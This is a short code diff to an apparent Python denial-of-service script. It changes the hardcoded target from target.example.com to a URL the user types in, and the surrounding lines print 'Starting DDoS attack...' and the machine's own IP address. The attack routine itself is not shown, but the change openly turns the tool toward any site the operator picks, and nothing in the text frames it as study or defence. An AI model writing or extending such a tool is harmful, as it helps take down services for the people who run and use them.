@@ -13,7 +13,7 @@ import urllib.request
 import socket
 import time
 
-TARGET = "https://target.example.com/"
+TARGET = input("Enter target URL: ")
 
 print("Starting DDoS attack...")
 print("My IP is:", socket.gethostbyname(socket.gethostname()))
